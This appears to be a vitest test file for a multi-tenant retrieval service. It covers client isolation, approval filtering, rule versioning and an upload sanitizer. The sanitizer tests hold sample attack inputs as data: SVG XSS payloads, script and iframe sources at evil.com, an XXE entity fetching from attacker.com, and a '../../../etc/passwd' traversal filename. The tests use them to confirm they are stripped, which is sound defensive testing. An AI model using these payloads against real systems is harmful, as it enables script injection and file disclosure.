import { describe, it, expect } from 'vitest';
import { DoclingParser } from '../src/docling-parser.js';
import { RetrievalService } from '../src/retrieval-service.js';
import { sanitizeUntrustedUpload } from '../src/upload-sanitizer.js';
import type { RequestContext } from '@hawa/contracts';
import { kaaeClientDNA } from '@hawa/domain';

describe('Retrieval: Ingestion & Client-Locked Search', () => {
  const ctx: RequestContext & { clientId: string } = {
    tenantId: 'tenant-1',
    clientId: 'client-aster',
    actor: { type: 'workflow', id: 'retrieval-wf' },
    correlationId: 'corr-1',
    deadline: new Date(Date.now() + 60000).toISOString(),
    idempotencyKey: 'retrieval-key-1',
  };

  it('DoclingParser: extracts paragraph chunks with coordinates and content hashes', async () => {
    const parser = new DoclingParser();
    const parsed = await parser.parse(
      'doc-1',
      'First paragraph of brand guide.\n\nSecond paragraph detailing logo clear space rules.',
      'text/plain',
      'brand_guide_v1.pdf'
    );

    expect(parsed.documentId).toBe('doc-1');
    expect(parsed.chunks.length).toBe(2);
    expect(parsed.chunks[0].sha256).toBeDefined();
    expect(parsed.chunks[0].metadata.coordinates).toBeDefined();
  });

  it('RetrievalService: strictly enforces client isolation and zero cross-client leakage', async () => {
    const service = new RetrievalService();

    // Ingest data for client Aster
    service.addKnowledgeItem({
      id: 'k-1',
      tenantId: ctx.tenantId,
      clientId: 'client-aster',
      kind: 'rule',
      sourceId: 'rule-aster-1',
      title: 'Aster Color Rule',
      text: 'Aster primary brand color is forest green #164a3a.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    // Ingest data for client Nova
    service.addKnowledgeItem({
      id: 'k-2',
      tenantId: ctx.tenantId,
      clientId: 'client-nova',
      kind: 'rule',
      sourceId: 'rule-nova-1',
      title: 'Nova Secret Brand Strategy',
      text: 'Nova confidential pricing strategy.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    // Query under client Aster
    const res = await service.retrieve(ctx, [
      { query: 'brand strategy color', kinds: ['rule'], topK: 10 },
    ]);

    expect(res.ok).toBe(true);
    if (res.ok) {
      const returnedIds = res.value.authoritative.rules.map((r) => r.id);
      expect(returnedIds).toContain('k-1');
      // Invariant 6: Zero cross-client leakage
      expect(returnedIds).not.toContain('k-2');
    }
  });

  it('RetrievalService: partitions positive references and negative constraints', async () => {
    const service = new RetrievalService();

    service.addKnowledgeItem({
      id: 'ex-pos',
      tenantId: ctx.tenantId,
      clientId: 'client-aster',
      kind: 'approved_example',
      sourceId: 'ex-1',
      title: 'Summer Poster 2025',
      text: 'High performing retail poster with warm gold accent.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    service.addKnowledgeItem({
      id: 'ex-neg',
      tenantId: ctx.tenantId,
      clientId: 'client-aster',
      kind: 'negative_example',
      sourceId: 'ex-neg-1',
      title: 'Rejected Draft 2025',
      text: 'Too busy typography and overlapping logo margin.',
      polarity: 'negative',
      approved: false,
      active: true,
      metadata: {},
    });

    const res = await service.retrieve(ctx, [
      { query: 'poster typography logo', kinds: ['approved_example', 'negative_example'], topK: 5 },
    ]);

    expect(res.ok).toBe(true);
    if (res.ok) {
      expect(res.value.evidence.some((c) => c.id === 'ex-pos')).toBe(true);
      expect(res.value.negativeEvidence.some((c) => c.id === 'ex-neg')).toBe(true);
    }
  });

  it('filters tenant and approval before scoring even when another item matches better', async () => {
    const service = new RetrievalService();
    const base = { clientId: ctx.clientId, kind: 'approved_example' as const,
      polarity: 'positive' as const, active: true, metadata: {} };
    service.addKnowledgeItem({ ...base, id: 'own', tenantId: ctx.tenantId, sourceId: 'own-source',
      title: 'Own poster', text: 'شیر', approved: true });
    service.addKnowledgeItem({ ...base, id: 'foreign-tenant', tenantId: 'tenant-2', sourceId: 'foreign-source',
      title: 'Foreign poster', text: 'شير شير شير', approved: true });
    service.addKnowledgeItem({ ...base, id: 'unapproved', tenantId: ctx.tenantId, sourceId: 'draft-source',
      title: 'Draft poster', text: 'شير شير شير', approved: false });
    service.addKnowledgeItem({ ...base, id: 'draft-logo', tenantId: ctx.tenantId, sourceId: 'draft-logo-source',
      kind: 'official_asset', title: 'Unapproved logo', text: 'شير logo', approved: false });

    const result = await service.retrieve(ctx, [{ query: 'شير', kinds: ['approved_example'], topK: 10 }]);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value.evidence.map((item) => item.id)).toEqual(['own']);
    expect(result.value.evidence[0].vectorScore).toBeUndefined();
    expect(result.value.evidence[0].rerankScore).toBeUndefined();
    expect(result.value.retrievalTrace.retrievalMode).toBe('lexical_only');
    expect(result.value.clientDnaVersion).toBe(0);

    const assetResult = await service.retrieve(ctx, [{ query: 'شير logo', kinds: ['official_asset'], topK: 10 }]);
    expect(assetResult.ok).toBe(true);
    if (!assetResult.ok) return;
    expect(assetResult.value.authoritative.assets).toHaveLength(0);
    expect(assetResult.value.evidence).toHaveLength(0);
    expect(assetResult.value.unresolvedConflicts).toEqual(expect.arrayContaining([
      expect.objectContaining({ conflictType: 'MISSING_BRAND_ASSET' }),
    ]));
  });

  it('refuses metadata-only ingestion and invented evaluation receipts', async () => {
    const service = new RetrievalService();
    const ingestion = await service.ingest(ctx, { sourceKind: 'document', sourceId: 'brand-guide',
      storageKey: 'sha256:placeholder', mimeType: 'text/plain', sha256: '0'.repeat(64) });
    expect(ingestion).toMatchObject({ ok: false, error: { code: 'RETRIEVAL_INGEST_NOT_IMPLEMENTED' } });
    expect(service.count()).toBe(0);
    const evaluation = await service.evaluate(ctx, 'unsealed-dataset', {});
    expect(evaluation).toMatchObject({ ok: false, error: { code: 'RETRIEVAL_EVALUATION_NOT_IMPLEMENTED' } });
  });

  it('does not reindex unchanged DNA and excludes superseded version rules', async () => {
    const service = new RetrievalService();
    service.indexClientDna(kaaeClientDNA);
    const firstCount = service.count();
    service.indexClientDna(kaaeClientDNA);
    expect(service.count()).toBe(firstCount);

    const next = structuredClone(kaaeClientDNA);
    next.version += 1;
    next.guidelines.layoutRules.push('Use a newly approved spacious grid.');
    service.indexClientDna(next);
    const ownContext = { ...ctx, tenantId: next.tenantId, clientId: next.clientId };
    const result = await service.retrieve(ownContext, [{ query: 'spacious grid', kinds: ['rule'], topK: 10 }]);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value.clientDnaVersion).toBe(next.version);
    expect(result.value.evidence).toHaveLength(1);
    expect(result.value.evidence[0].metadata.dnaVersion).toBe(next.version);
    expect(result.value.evidence[0].metadata.dnaHash).toMatch(/^[0-9a-f]{64}$/);
  });

  it('sanitizeUntrustedUpload: strips dangerous tags, handlers, unquoted schemes, and inline style XSS', () => {
    const maliciousSvg = '<svg/onload=alert(1)><foreignObject><iframe src="http://evil.com"></iframe></foreignObject><a href=javascript:alert(2)><text>click</text></a><circle style="background:url(javascript:alert(3))" /></svg>';

    const res = sanitizeUntrustedUpload({
      filename: 'asset.svg',
      mimeType: 'image/svg+xml',
      content: maliciousSvg,
    });

    expect(res.ok).toBe(true);
    if (res.ok) {
      const sanitized = res.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('foreignObject');
      expect(sanitized).not.toContain('iframe');
      expect(sanitized).not.toContain('javascript:alert');
      expect(sanitized).not.toContain('background:url');
      expect(res.value.warnings.length).toBeGreaterThan(0);
    }
  });

  it('sanitizeUntrustedUpload: neutralizes slash-delimited script tags and multiline DOCTYPE DTD expansions', () => {
    const maliciousSvg = '<svg><script/src="http://evil.com/xss.js"></script><text>logo</text></svg>';
    const res = sanitizeUntrustedUpload({
      filename: 'exploit.svg',
      mimeType: 'image/svg+xml',
      content: maliciousSvg,
    });

    expect(res.ok).toBe(true);
    if (res.ok) {
      const sanitized = res.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('script');
      expect(sanitized).not.toContain('evil.com');
      expect(res.value.warnings.length).toBeGreaterThan(0);
    }

    const xxeSvg = '<!DOCTYPE svg [\n  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">\n  %remote;\n]>\n<svg><text>hello</text></svg>';
    const xxeRes = sanitizeUntrustedUpload({
      filename: '../../../etc/passwd',
      mimeType: 'image/svg+xml',
      content: xxeSvg,
    });

    expect(xxeRes.ok).toBe(true);
    if (xxeRes.ok) {
      const sanitized = xxeRes.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('<!DOCTYPE');
      expect(sanitized).not.toContain('%remote;');
      expect(sanitized).not.toContain(']>');
      // Filename path traversal stripped
      expect(xxeRes.value.filename).toBe('passwd');
    }
  });
});
